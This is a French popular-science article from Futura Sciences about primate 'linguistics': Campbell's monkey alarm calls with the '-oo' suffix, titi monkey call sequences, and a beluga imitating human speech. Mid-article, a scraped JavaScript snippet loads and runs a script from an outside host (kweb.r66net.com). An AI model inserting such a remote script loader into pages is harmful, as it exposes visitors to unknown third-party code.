{"title": "Science decalee : apprenez a parler le singe", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-05-06", "content": "Apres des annees d'etudes sur les differents types d'appels emis par des singes, des chercheurs  sont en mesure de decrire les bases de la linguistique des primates. Peut-etre bientot un nouveau dictionnaire a rajouter dans les bibliotheques. Parlez-vous le langage  singe  ? Pour vous aider a dire vos premiers mots, des linguistes et des primatologues ont reuni leurs efforts pour poser les bases de la << linguistique des  primates  >>, permettant ainsi de mieux comprendre ce qu'ils se racontent entre eux. Au CNRS, a l' institut Jean- Nicod , c'est l'equipe de Philippe Schlenker qui travaille sur ces sujets. Les chercheurs ont utilise des methodes de la  linguistique  theorique pour comprendre ce que disaient les singes. Comme l'explique Philippe Schenker,  << En utilisant cette approche, nous pouvons comparer une  espece  de singe a l'autre et voir, par exemple, que certains de leurs appels ont ete conserves plus de trois millions d'annees. >> Les chercheurs ont etudie les appels emis par  differentes especes de primates : chez le singe Titi, qui fait l'objet dune publication recente dans la revue  Natural Language & Linguistic Theory , ou chez des  cercopitheques  comme le mone de Campbell. Les chercheurs ont analyse la structure de leur langage et le placement des sons, pour comprendre le sens de ces << phrases >>. Certes, le  langage  de ces primates apparait bien plus simple que celui de l'Homme. Mais les animaux etudies montrent tout de meme des competences linguistiques etonnantes.  Pour discuter avec le mone de Campbell, le suffixe <<-oo >> peut aider a se faire comprendre.(c) muuraa, Shutterstock                               Les singes decrivent dans leur langage la nature et le lieu d'une menace Chez le  mone de Campbell , un suffixe ( << -oo >> ) a ete decrit, preuve de l'existence d'une semantique basique. Ce singe africain est capable de combiner differents mots de base ( << hok >>, << krak >>, << boom >> ) tout en utilisant le suffixe  << -oo >> . Par exemple,  << hok >>  veut dire qu'il y a une menace aerienne serieuse comme un aigle ; en ajoutant le suffixe  << -oo >> , la menace  << hok-oo >>  devient plus generale (il y a quelque chose en haut). De meme,  << krak >>  indique la presence d'une grave menace au sol (un  leopard ) alors qu'avec le suffixe  << krak-oo >>  voudra dire qu'une menace vient du sol.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La facon dont les  mots  sont combines decrit la nature de la menace et le niveau de danger qu'elle represente. C'est aussi ce qui est observe chez d'autres primates. Ainsi, les singes Titi utilisent deux types d'appels, symbolises par les lettres A et B. L'ordre des sons indique quel est le type de predateur et ou il se trouve :  une repetition de A (AAAA...) veut dire qu'il y a un  rapace  dans la  canopee ,  une succession de A puis une succession de B signifient que le rapace est au sol (AAA...BBBB...,),  un A suivi d'une succession de B veut dire qu'un chat est au sol (ABBBB...),  une succession de B que le chat est dans la canopee (BBBBB...). Bon interro maintenant : comment direz-vous qu'il y a un grave danger dans le ciel ? Noc, le belouga qui parle aux humains                       Ce son etonnant est emis par Noc, un belouga (ou baleine franche) qui a vecu une30 ans dans l'aquarium de San Diego. En entendant les plongeurs, le cetace aurait voulu imiter le langage humain de ses soigneurs. (c) Current Biology, Ridgway et al.                                       ", "theme": "planete"}